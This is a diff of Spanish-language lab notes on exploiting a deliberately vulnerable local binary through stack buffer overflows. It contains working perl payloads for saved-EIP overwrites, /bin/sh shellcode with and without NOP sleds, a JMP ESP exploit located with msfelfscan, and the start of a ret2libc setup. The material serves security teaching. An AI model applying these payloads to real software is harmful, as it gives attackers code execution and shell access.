@@ -10,14 +10,17 @@ Autor: Gabriel Maciá
 
 1) Ejecutar la función éxito: 
 	Cambiar el valor de la variable "valor" a 3: 
-		./vuln1_stack `perl -e 'print "A"x500 . "\x03"'`
+		./vuln `perl -e 'print "A"x500 . "\x03"'`
 
 2) Ejecutar la función exito2
-	- Localizar el valor del puntero a la funcion exito2: 0x804858d
-	- Localizar la posición del Saved EIP con gdb. 
-	- Hacer overflow del SEIP.
+	- Localizar el valor del puntero a la funcion exito2: 
+			(gdb) print exito2
+			$1 = {int ()} 0x8049325 <exito2>0x8049325
+			
+	- Localizar la posición del Saved EIP con gdb --> offset de 516 bytes
+	- Hacer overflow del Saved EIP.
 	
-		./vuln1_stack `perl -e 'print "A"x500 . "B"x16 . "\x8d\x85\x04\x08"'`
+		./vuln `perl -e 'print "A"x500 . "B"x16 . "\x25\x93\x04\x08"'`
 
 3) Ejecutar una shellcode que arranque /bin/sh:
 
@@ -25,29 +28,31 @@ Autor: Gabriel Maciá
 		execve ("/bin/sh", ["/bin/sh"], 0)
 		"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 		
-
 	Sin NOP Sled
-		./vuln1_stack `perl -e 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x475 . "\x03" . "B"x15 . "\xe8\xef\xff\xbf" '`
+		./vuln `perl -e 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x475 . "\x03" . "B"x15 . "\xc8\xcf\xff\xff" '`  
 
 	Con NOP Sled
-		./vuln1_stack `perl -e 'print "\x90"x70 . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x405 . "\x03" . "B"x15 . "\xe8\xef\xff\xbf" '`
+		./vuln `perl -e 'print "\x90"x70 . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x405 . "\x03" . "B"x15 . "\xc8\xcf\xff\xff" '`
 
 5) Técnica JMP ESP:  www.exploit-db.com/papers/13232
 	Evita tener que conocer la posición exacta del buffer. Es similar a la anterior, pero en este caso escribirmos el payload después del savedEIP y en el savedEIP llamamos a una instrucción JMP $ESP.
 		
-		root@kali:~/# /usr/share/framework2/msfelfscan -f ./vuln1_stack -j esp
+		root@kali:~/# /usr/share/framework2/msfelfscan -f ./vuln -j esp
 		0x08049444   jmp esp
 		 
 	A veces no se encuentra esta instruccion, pero se puede encontrar entrelazada en otras instrucciones, dado que jmp $esp es \xff\xe4
 	
 	La explotación se consigue entonces asi: 
 	
-		./vuln1_stack `perl -e 'print "A"x500 . "B"x16 . "\x44\x94\x04\x08" . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+		./vuln `perl -e 'print "A"x500 . "B"x16 . "\x44\x94\x04\x08" . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
 
 6) Técnica ret2libc. 
 
 	Compilar con NX y probamos los exploits anteriores y vemos que no se ejecutan. 
-		./compile vuln_stack.c nx 
+		# ./compile vuln_stack.c nx 
+		# mv vuln_stack vuln_stack_nx
+		# rm vuln
+		# ln -s vuln_stack_nx vuln
 	
 	Utilizamos entonces la técnica ret2libc (explicación en clase)
 	
